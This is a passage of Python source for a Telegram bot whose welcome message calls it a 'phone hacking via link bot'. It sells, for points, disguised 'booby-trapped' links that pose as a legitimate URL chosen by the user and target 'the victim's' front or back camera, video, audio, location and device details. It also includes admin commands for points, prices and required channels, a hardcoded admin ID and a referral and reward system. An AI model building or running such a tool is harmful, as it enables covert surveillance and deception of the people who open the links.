    # ====== الميزات الأساسية (كاميرا، فيديو، إلخ) ======
    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
        user = get_user(user_id)
        
        feature_map = {
            'camera_front': 'camera',
            'camera_back': 'camera',
            'video_front': 'video',
            'video_back': 'video',
            'audio': 'audio',
            'location': 'location',
            'device': 'device',
            'all': 'all'
        }
        feature_key = feature_map.get(data, 'all')
        prices = get_prices()
        required_points = prices.get(feature_key, 5)
        
        if user and user['points'] < required_points:
            bot.answer_callback_query(
                call.id,
                f"❌ لا يوجد نقاط كافية! تحتاج {required_points} نقطة."
            )
            bot.send_message(
                user_id,
                f"❌ **نقاط غير كافية!**\n\n"
                f"هذه الميزة تحتاج **{required_points}** نقطة.\n"
                f"رصيدك الحالي: **{user['points']}** نقطة.\n\n"
                f"💡 اشترِ نقاطاً أو ادعُ أصدقاءك لكسب نقاط إضافية."
            )
            return
        
        deduct_points(user_id, required_points, f'استخدام {data}')
        
        user_states[user_id] = f'waiting_url_{data}'
        bot.send_message(
            user_id,
            f"📤 أرسل الآن **الرابط الأصلي**\n"
            f"(الموقع الذي تريد توجيه الضحية إليه)\n\n"
            f"💡 تم خصم {required_points} نقطة مقابل هذه الخدمة."
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== أي شيء آخر ======
    bot.answer_callback_query(call.id, "❌ خيار غير معروف")

# ====== أوامر البوت ======
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if len(message.text.split()) > 1:
        invite_code = message.text.split()[1]
        conn = get_db()
        inviter = conn.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,)).fetchone()
        conn.close()
        if inviter and not user:
            invited_by = inviter['user_id']
        else:
            invited_by = None
    else:
        invited_by = None
    
    if not user:
        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '', invited_by)
        user = get_user(user_id)
    
    points = user['points'] if user else 0
    
    msg = f"""
🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**
    """
    bot.send_message(
        user_id,
        msg,
        parse_mode='Markdown',
        reply_markup=main_menu(user_id)
    )

@bot.message_handler(commands=['admin'])
def make_admin_cmd(message):
    if message.from_user.id == 6904264075:
        conn = get_db()
        conn.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (message.from_user.id,))
        conn.commit()
        conn.close()
        bot.reply_to(message, "✅ تم تفعيل صلاحيات الإدارة")
    else:
        bot.reply_to(message, "❌ غير مصرح لك")

@bot.message_handler(commands=['add_points'])
def add_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        add_points(target_id, points, f'إضافة من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم إضافة {points} نقاط للمستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['deduct_points'])
def deduct_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /deduct_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        deduct_points(target_id, points, f'خصم من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم خصم {points} نقاط من المستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['set_price'])
def set_price_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /set_price [الميزة] [السعر]")
            return
        feature = parts[1].lower()
        price = int(parts[2])
        
        valid_features = ['camera', 'audio', 'video', 'location', 'device', 'all']
        if feature not in valid_features:
            bot.reply_to(message, f"❌ الميزة غير صالحة. الميزات المتاحة: {', '.join(valid_features)}")
            return
        
        set_price(feature, price)
        bot.reply_to(message, f"✅ تم تعيين سعر {feature} إلى {price} نقاط")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['add_channel'])
def add_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_channel [id] [الاسم]")
            return
        channel_id = parts[1]
        channel_name = parts[2]
        add_required_channel(channel_id, channel_name)
        bot.reply_to(message, f"✅ تم إضافة القناة: {channel_name}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['remove_channel'])
def remove_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /remove_channel [id]")
            return
        channel_id = parts[1]
        remove_required_channel(channel_id)
        bot.reply_to(message, f"✅ تم حذف القناة")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['create_reward'])
def create_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(
                message,
                "❌ **استخدم:** `/create_reward [عدد النقاط] [عدد الأعضاء]`\n"
                "مثال: `/create_reward 50 10`\n\n"
                "يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود"
            )
            return
        
        points = int(parts[1])
        member_count = int(parts[2])
        
        code = secrets.token_hex(4).upper()
        create_group_reward(user_id, points, member_count, code)
        
        bot.reply_to(
            message,
            f"✅ **تم إنشاء المكافأة!**\n\n"
            f"🔑 **الكود:** `{code}`\n"
            f"⭐ **النقاط:** {points} نقطة لكل مستخدم\n"
            f"👥 **العدد:** {member_count} مستخدم\n\n"
            f"📌 **للاستخدام:** أرسل هذا الكود للمستخدمين، وسيحصلون على النقاط عند استخدام الأمر:\n"
            f"`/use_reward {code}`"
        )
    except ValueError:
        bot.reply_to(message, "❌ تأكد من أن الأرقام صحيحة")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(commands=['use_reward'])
def use_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ يرجى استخدام /start أولاً")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(
                message,
                "❌ **استخدم:** `/use_reward [الكود]`\n"
                "مثال: `/use_reward ABC123`"
            )
            return
        
        code = parts[1].upper()
        result, data = use_group_reward(code, user_id)
        
        if result:
            user = get_user(user_id)
            bot.reply_to(
                message,
                f"✅ **تم استلام المكافأة!**\n\n"
                f"⭐ تم إضافة **{data}** نقاط إلى رصيدك.\n"
                f"💰 رصيدك الحالي: **{user['points']}** نقطة."
            )
        else:
            if data == 'already_used':
                bot.reply_to(message, "❌ لقد استخدمت هذا الكود مسبقاً")
            elif data == 'full':
                bot.reply_to(message, "❌ تم استخدام هذا الكود بالكامل (انتهى العدد المحدد)")
            elif data == 'not_found':
                bot.reply_to(message, "❌ الكود غير صحيح")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
def handle_original_url(message):
    user_id = message.from_user.id
    state = user_states.get(user_id, '')
    if not state.startswith('waiting_url_'):
        return
    feature = state.replace('waiting_url_', '')
    original_url = message.text.strip()
    
    if not is_valid_url(original_url):
        bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
        return
    
    session_id, fake_url = create_session(user_id, feature, original_url, {})
    del user_states[user_id]
    
    bot.reply_to(message, f"""
🔗 **تم إنشاء الرابط الملغم**

📌 **الرابط الملغم:**
<code>{fake_url}</code>

🔗 **الرابط الأصلي:**
<code>{original_url}</code>

📋 **الميزة:** {feature}
⏱ الصلاحية: 5 دقائق

⚠️ الرابط يبدو وكأنه الرابط الأصلي!
    """, parse_mode='HTML')
    
# ====== تشغيل البوت ======
def run_bot():
    print("🤖 بدء تشغيل البوت...")
    try:
        bot.delete_webhook()
        print("✅ تم حذف Webhook القديم")
    except Exception as e:
        print(f"⚠️ خطأ في حذف Webhook: {e}")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"⚠️ خطأ في البوت: {e}")
            time.sleep(5)

# ====== بدء التشغيل ======
print("🚀 جاري تهيئة قاعدة البيانات...")
init_db()
print("✅ قاعدة البيانات جاهزة")

bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()
print("🤖 تم تشغيل البوت في الخلفية")

# ============================================================
#  تشغيل السيرفر
# ============================================================

if __name__ != '__main__':
    print("🚀 السيرفر جاهز للعمل مع gunicorn")
else:
    app.run(host='0.0.0.0', port=5000)
